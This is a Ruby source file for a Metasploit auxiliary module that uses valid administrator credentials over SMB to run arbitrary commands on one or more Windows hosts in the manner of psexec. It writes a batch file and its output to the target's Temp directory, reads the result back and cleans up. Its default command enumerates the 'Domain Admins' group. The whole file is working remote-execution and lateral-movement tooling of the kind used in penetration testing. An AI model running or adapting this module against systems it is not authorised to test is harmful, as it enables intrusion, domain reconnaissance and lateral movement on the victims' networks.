##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Authenticated Administration Utility',
      'Description'    => %q{
          This module uses a valid administrator username and password to execute an
        arbitrary command on one or more hosts, using a similar technique than the "psexec"
        utility provided by SysInternals. Daisy chaining commands with '&' does not work
        and users shouldn't try it. This module is useful because it doesn't need to upload
        any binaries to the target machine.
      },

      'Author'         => [
        'Royce Davis @R3dy__ <rdavis[at]accuvant.com>',
      ],

      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
        [ 'OSVDB', '3106'],
        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
        [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
      ]
    ))

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
    ], self.class)

    register_advanced_options([
      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),
      OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
      OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
    ], self.class)

    deregister_options('RHOST')
  end

  # This is the main controle method
  def run_host(ip)
    text = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.txt"
    bat  = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.bat"
    @smbshare = datastore['SMBSHARE']
    @ip = ip

    # Try and authenticate with given credentials
    if connect
      begin
        smb_login
      rescue Rex::Proto::SMB::Exceptions::Error => autherror
        print_error("Unable to authenticate with given credentials: #{autherror}")
        return
      end
      res = execute_command(text, bat)

      if res
        for i in 0..(datastore['RETRY'])
          Rex.sleep(datastore['DELAY'])
          # if the output file is still locked then the program is still likely running
          if (exclusive_access(text))
            break
          elsif (i == datastore['RETRY'])
            print_error("Command seems to still be executing. Try increasing RETRY and DELAY")
          end
        end
        get_output(text)
      end

      cleanup_after(text, bat)
      disconnect
    end
  end

  # Executes specified Windows Command
  def execute_command(text, bat)
    # Try and execute the provided command
    execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
    print_status("Executing the command...")
    begin
      return psexec(execute)
    rescue Rex::Proto::DCERPC::Exceptions::Error, Rex::Proto::SMB::Exceptions::Error => exec_command_error
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}", 'rex', LEV_3)
      print_error("Unable to execute specified command: #{exec_command_error}")
      return false
    end
  end

  # Retrive output from command
  def get_output(file)
    print_status("Getting the command output...")
    output = smb_read_file(@smbshare, @ip, file)
    if output.nil?
      print_error("Error getting command output. #{$!.class}. #{$!}.")
      return
    end
    if output.empty?
      print_status("Command finished with no output")
      return
    end

    # Report output
    print_good("Command completed successfuly!")
    vprint_status("Output for \"#{datastore['COMMAND']}\":")
    vprint_line("#{output}")

    report_note(
      :rhost => datastore['RHOSTS'],
      :rport => datastore['RPORT'],
      :type => "psexec_command",
      :name => datastore['COMMAND'],
      :data => output
    )

  end

  # check if our process is done using these files
  def exclusive_access(*files)
      simple.connect("\\\\#{@ip}\\#{@smbshare}")
      files.each do |file|
      begin
        print_status("checking if the file is unlocked")
        fd = smb_open(file, 'rwo')
        fd.close
      rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
        print_status("Unable to get handle: #{accesserror}")
        return false
      end
      simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
    end
    return true
  end


  # Removes files created during execution.
  def cleanup_after(*files)
    simple.connect("\\\\#{@ip}\\#{@smbshare}")
    print_status("Executing cleanup...")
    files.each do |file|
      begin
        smb_file_rm(file)
      rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
        print_error("Unable to cleanup #{file}. Error: #{cleanuperror}")
      end
    end
    left = files.collect{ |f| smb_file_exist?(f) }
    if left.any?
      print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
    else
      print_status("Cleanup was successful")
    end
  end

end
